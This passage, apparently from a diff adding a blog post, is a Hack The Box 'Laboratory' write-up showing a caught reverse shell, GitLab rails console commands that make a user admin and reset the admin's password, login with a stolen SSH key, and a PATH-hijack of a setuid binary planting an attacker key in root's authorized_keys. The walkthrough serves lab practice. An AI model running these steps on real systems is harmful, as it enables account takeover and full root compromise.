+6OkRlcHJlY2F0aW9uAAY7ClQ=--c13c402abdc9f0aabfd22f5544ab2d713e509334"</span>
+</code></pre></div></div>
+
+<p>Make sure to start the webserver and nc listener before executing the curl command:</p>
+
+<p><img src="/assets/Laboratory/shell.png" alt="shell" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/laboratory
+→ nc <span class="nt">-lvnp</span> 4444
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.216.
+Ncat: Connection from 10.10.10.216:57334.
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ id
+uid=998(git) gid=998(git) groups=998(git)
+$ python3 -c "import pty;pty.spawn('</span>/bin/bash<span class="s1">')"
+git@git:~/gitlab-rails/working$
+</span></code></pre></div></div>
+
+<h2 id="shell-as-dexter">Shell as dexter</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Initial enumeration confirms we are inside a docker container:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git@git:/<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-i</span>
+172.17.0.2
+git@git:/<span class="nv">$ </span><span class="nb">hostname
+</span>git.laboratory.htb
+</code></pre></div></div>
+
+<p>Also, there is <code class="language-plaintext highlighter-rouge">.dockerenv</code> to confirm the same</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git@git:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 88
+drwxr-xr-x   1 root root 4096 Jul  2  2020 <span class="nb">.</span>
+drwxr-xr-x   1 root root 4096 Jul  2  2020 ..
+<span class="nt">-rwxr-xr-x</span>   1 root root    0 Jul  2  2020 .dockerenv
+<span class="nt">-rw-r--r--</span>   1 root root  157 Feb 24  2020 RELEASE
+drwxr-xr-x   2 root root 4096 Feb 24  2020 assets
+drwxr-xr-x   1 root root 4096 Feb 24  2020 bin
+drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
+drwxr-xr-x   5 root root  340 Apr 21 05:04 dev
+drwxr-xr-x   1 root root 4096 Jul  2  2020 etc
+<span class="o">[</span>..SNIP..]
+</code></pre></div></div>
+
+<p>Now our next approach should be to either escape this container or elevate privileges to root in this container, however none of it was possible here.</p>
+
+<h3 id="gitlab---securedocker-project-access">GitLab - SecureDocker Project access</h3>
+
+<p>Since we are inside GitLab container, we can make of use Gitlab-rails console to manipulate GitLab user data:</p>
+
+<p>Here are some Cheatsheet which I referred initially : <a href="https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html"><strong>Cheatsheet1</strong></a> &amp; <a href="https://docs.gitlab.com/ee/security/reset_user_password.html"><strong>Cheatsheet</strong></a></p>
+
+<h4 id="admin-priv---self">Admin Priv - Self</h4>
+
+<p>Firstly, We can grant ourself admin privilege:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">git</span><span class="vi">@git</span><span class="ss">:~</span><span class="err">$</span> <span class="n">gitlab</span><span class="o">-</span><span class="n">rails</span> <span class="n">console</span>
+<span class="o">--------------------------------------------------------------------------------</span>
+ <span class="no">GitLab</span><span class="p">:</span>       <span class="mf">12.8</span><span class="o">.</span><span class="mi">1</span> <span class="p">(</span><span class="n">d18b43a5f5a</span><span class="p">)</span> <span class="no">FOSS</span>
+ <span class="no">GitLab</span> <span class="no">Shell</span><span class="p">:</span> <span class="mf">11.0</span><span class="o">.</span><span class="mi">0</span>
+ <span class="no">PostgreSQL</span><span class="p">:</span>   <span class="mf">10.12</span>
+<span class="o">--------------------------------------------------------------------------------</span>
+<span class="no">Loading</span> <span class="n">production</span> <span class="n">environment</span> <span class="p">(</span><span class="no">Rails</span> <span class="mf">6.0</span><span class="o">.</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">001</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="p">.</span><span class="nf">active</span>
+<span class="no">User</span><span class="p">.</span><span class="nf">active</span>
+<span class="o">=&gt;</span> <span class="c1">#&lt;ActiveRecord::Relation [#&lt;User id:4 @seven&gt;, #&lt;User id:1 @dexter&gt;, #&lt;User id:5 @tuser&gt;, #&lt;User id:6 @cfx&gt;]&gt;</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">002</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="p">.</span><span class="nf">admins</span>
+<span class="no">User</span><span class="p">.</span><span class="nf">admins</span>
+<span class="o">=&gt;</span> <span class="c1">#&lt;ActiveRecord::Relation [#&lt;User id:1 @dexter&gt;]&gt;</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">003</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">cfx</span><span class="p">.</span><span class="nf">admin</span> <span class="o">=</span> <span class="kp">true</span>
+<span class="n">cfx</span><span class="p">.</span><span class="nf">admin</span> <span class="o">=</span> <span class="kp">true</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">004</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">cfx</span><span class="p">.</span><span class="nf">save</span>
+<span class="n">cfx</span><span class="p">.</span><span class="nf">save</span>
+<span class="o">=&gt;</span> <span class="kp">true</span>
+</code></pre></div></div>
+<p><img src="/assets/Laboratory/adm.png" alt="adm" /></p>
+
+<p>Now we can see admin icon on our account, as a result we can now access Dexter’s <code class="language-plaintext highlighter-rouge">SecureDocker</code> Project.</p>
+
+<h4 id="password-reset---dexter">Password reset - Dexter</h4>
+
+<p>We saw Dexter is the only admin, so we can even reset his password:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">git</span><span class="vi">@git</span><span class="ss">:/</span><span class="err">$</span> <span class="n">gitlab</span><span class="o">-</span><span class="n">rails</span> <span class="n">console</span>
+<span class="o">--------------------------------------------------------------------------------</span>
+ <span class="no">GitLab</span><span class="p">:</span>       <span class="mf">12.8</span><span class="o">.</span><span class="mi">1</span> <span class="p">(</span><span class="n">d18b43a5f5a</span><span class="p">)</span> <span class="no">FOSS</span>
+ <span class="no">GitLab</span> <span class="no">Shell</span><span class="p">:</span> <span class="mf">11.0</span><span class="o">.</span><span class="mi">0</span>
+ <span class="no">PostgreSQL</span><span class="p">:</span>   <span class="mf">10.12</span>
+<span class="o">--------------------------------------------------------------------------------</span>
+<span class="no">Loading</span> <span class="n">production</span> <span class="n">environment</span> <span class="p">(</span><span class="no">Rails</span> <span class="mf">6.0</span><span class="o">.</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">001</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">user</span> <span class="o">=</span> <span class="no">User</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="ss">id: </span><span class="mi">1</span><span class="p">).</span><span class="nf">first</span>
+<span class="o">=&gt;</span> <span class="c1">#&lt;User id:1 @dexter&gt;</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">002</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">user</span><span class="p">.</span><span class="nf">password</span> <span class="o">=</span> <span class="s1">'cold_fusion'</span>
+<span class="o">=&gt;</span> <span class="s2">"cold_fusion"</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">003</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">user</span><span class="p">.</span><span class="nf">password_confirmation</span> <span class="o">=</span> <span class="s1">'cold_fusion'</span>
+<span class="o">=&gt;</span> <span class="s2">"cold_fusion"</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">004</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="n">user</span><span class="p">.</span><span class="nf">save!</span>
+<span class="no">Enqueued</span> <span class="no">ActionMailer</span><span class="o">::</span><span class="no">DeliveryJob</span> <span class="p">(</span><span class="no">Job</span> <span class="no">ID</span><span class="p">:</span> <span class="n">f4543159</span><span class="o">-</span><span class="mf">759e-4879</span><span class="o">-</span><span class="mf">885e-8688</span><span class="n">d65ec401</span><span class="p">)</span> <span class="n">to</span> <span class="no">Sidekiq</span><span class="p">(</span><span class="n">mailers</span><span class="p">)</span> <span class="n">with</span> <span class="ss">arguments: </span><span class="s2">"DeviseMailer"</span><span class="p">,</span> <span class="s2">"password_change"</span><span class="p">,</span> <span class="s2">"deliver_now"</span><span class="p">,</span> <span class="c1">#&lt;GlobalID:0x00007fa1b4dcbda8 @uri=#&lt;URI::GID gid://gitlab/User/1&gt;&gt;</span>
+<span class="o">=&gt;</span> <span class="kp">true</span>
+<span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">005</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="nb">exit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="ssh---dexter">SSH - Dexter</h3>
+
+<p>Now we can login to GitLab as dexter where we see another Project <code class="language-plaintext highlighter-rouge">SecureDocker</code> :</p>
+
+<p><img src="/assets/Laboratory/dexter.png" alt="dexter" /></p>
+
+<p>Inside project, first thing we find is an <code class="language-plaintext highlighter-rouge">todo.txt</code> which seems to be some kind of pending task list:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># DONE: Secure docker for regular users</span>
+<span class="c">### DONE: Automate docker security on startup</span>
+<span class="c"># TODO: Look into "docker compose"</span>
+<span class="c"># TODO: Permanently ban DeeDee from lab</span>
+</code></pre></div></div>
+
+<p>On first glance it doesnt make much sense so we’ll look into later.</p>
+
+<p>But what’s more interesting is that folder dexter contains an <code class="language-plaintext highlighter-rouge">.ssh</code> folder with an private ssh key:</p>
+
+<p><img src="/assets/Laboratory/ssh.png" alt="ssh" /></p>
+
+<p>Using this key we can SSH as dexter:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/laboratory
+→ ssh <span class="nt">-i</span> id_rsa dexter@10.10.10.216
+dexter@laboratory:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
+dexter@laboratory:~<span class="nv">$ </span><span class="nb">whoami
+</span>dexter
+</code></pre></div></div>
+
+<p>Grabbing <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+7c447991fdff874<span class="k">*****************</span>
+
+</code></pre></div></div>
+
+<h2 id="privesc-dexter----root">PrivEsc dexter -&gt;  root</h2>
+
+<h3 id="enumeration-1">Enumeration</h3>
+
+<p>Searching for <code class="language-plaintext highlighter-rouge">SUID</code> binaries we find one in <code class="language-plaintext highlighter-rouge">/usr/local/bin/</code></p>
+
+<blockquote>
+  <p>/usr/local/bin is the location for all add-on executables that you add to the system to be used as common system files by all users but, are not official files supported by the OS.</p>
+</blockquote>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'snap'</span> | xargs <span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nt">-rwsr-sr-x</span> 1 daemon daemon      55560 Nov 12  2018 /usr/bin/at
+<span class="nt">-rwsr-xr-x</span> 1 root   root        85064 May 28  2020 /usr/bin/chfn
+<span class="nt">-rwsr-xr-x</span> 1 root   root        53040 May 28  2020 /usr/bin/chsh
+<span class="nt">-rwsr-xr-x</span> 1 root   root        39144 Mar  7  2020 /usr/bin/fusermount
+<span class="nt">-rwsr-xr-x</span> 1 root   root        88464 May 28  2020 /usr/bin/gpasswd
+<span class="nt">-rwsr-xr-x</span> 1 root   root        55528 Apr  2  2020 /usr/bin/mount
+<span class="nt">-rwsr-xr-x</span> 1 root   root        44784 May 28  2020 /usr/bin/newgrp
+<span class="nt">-rwsr-xr-x</span> 1 root   root        68208 May 28  2020 /usr/bin/passwd
+<span class="nt">-rwsr-xr-x</span> 1 root   root        31032 Aug 16  2019 /usr/bin/pkexec
+<span class="nt">-rwsr-xr-x</span> 1 root   root        67816 Apr  2  2020 /usr/bin/su
+<span class="nt">-rwsr-xr-x</span> 1 root   root       166056 Jan 19 14:21 /usr/bin/sudo
+<span class="nt">-rwsr-xr-x</span> 1 root   root        39144 Apr  2  2020 /usr/bin/umount
+<span class="nt">-rwsr-xr--</span> 1 root   messagebus  51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+<span class="nt">-rwsr-xr-x</span> 1 root   root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+<span class="nt">-rwsr-xr-x</span> 1 root   root       473576 May 29  2020 /usr/lib/openssh/ssh-keysign
+<span class="nt">-rwsr-xr-x</span> 1 root   root        22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+<span class="nt">-rwsr-xr-x</span> 1 root   dexter      16720 Aug 28  2020 /usr/local/bin/docker-security
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/usr/local/bin/docker-security</code> looks to be something which was mentioned in <code class="language-plaintext highlighter-rouge">todo.txt</code> so probably this is our next target.</p>
+
+<p>But on running it nothing happens:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span>docker-security
+dexter@laboratory:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>So we can run it with <code class="language-plaintext highlighter-rouge">ltrace</code> :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span>ltrace docker-security
+setuid<span class="o">(</span>0<span class="o">)</span>                                                                                                                         <span class="o">=</span> <span class="nt">-1</span>
+setgid<span class="o">(</span>0<span class="o">)</span>                                                                                                                         <span class="o">=</span> <span class="nt">-1</span>
+system<span class="o">(</span><span class="s2">"chmod 700 /usr/bin/docker"</span>/tmp/chmod: 1: cannot create /root/.ssh/authorized_keys: Permission denied
+ &lt;no <span class="k">return</span> ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span>                                                                                                            <span class="o">=</span> 512
+system<span class="o">(</span><span class="s2">"chmod 660 /var/run/docker.sock"</span>/tmp/chmod: 1: cannot create /root/.ssh/authorized_keys: Permission denied
+ &lt;no <span class="k">return</span> ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span>                                                                                                            <span class="o">=</span> 512
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</code></pre></div></div>
+
+<p>Looking at the trace, binary is calling <code class="language-plaintext highlighter-rouge">system("chmod 700 /usr/bin/docker")</code>. Now the interesting thing to notice is that <code class="language-plaintext highlighter-rouge">chmod</code> is not called from it’s absolute path which should be <code class="language-plaintext highlighter-rouge">/usr/bin/chmod</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span>which <span class="nb">chmod</span>
+/usr/bin/chmod
+</code></pre></div></div>
+
+<p>Current path :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
+</code></pre></div></div>
+
+<p>So we can forge <code class="language-plaintext highlighter-rouge">chmod</code> of our own, update the path and confuse the application execute our <code class="language-plaintext highlighter-rouge">chmod</code></p>
+
+<p>I’ll create a ssh key using <code class="language-plaintext highlighter-rouge">ssh-keygen -f cfx</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:/tmp<span class="nv">$ </span><span class="nb">cat chmod
+echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFJ4KUY9Dzy4UKYRwT+ORSIGW1W2YSKQrqIlNfRksWqWOz3bCJCE5gImrgx/lsL/kItrEvy9js4nQ1zmUrJ6kSYU7[..SNIP..]Rws4b8UeKpU+ft6Uk root@cfx"</span> <span class="o">&gt;</span> /root/.ssh/authorized_keys
+
+dexter@laboratory:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">chmod
+</span>dexter@laboratory:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</code></pre></div></div>
+
+<p>Updated PATH:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
+</code></pre></div></div>
+
+<p>Here the first path is <code class="language-plaintext highlighter-rouge">/tmp</code> so next time when we run the binary it will first go inside <code class="language-plaintext highlighter-rouge">/tmp</code>, fetch and run our malicious <code class="language-plaintext highlighter-rouge">chmod</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:/tmp$ /usr/local/bin/docker-security
+</code></pre></div></div>
+
+<p>This should have successfully copied our public ssh key to <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> as a result we can SSH as root with out private key:</p>
+
+<h3 id="ssh---root">SSH - root</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/docker
+→ ssh <span class="nt">-i</span> cfx root@10.10.10.216
+root@laboratory:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@laboratory:~# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+
+<p>Grabbing <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@laboratory:~# <span class="nb">cat </span>root.txt
+0bc02b1afb2b28<span class="k">******************</span>
+
+</code></pre></div></div>
+
+<p>And we pwned the Box !</p>
+
+<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
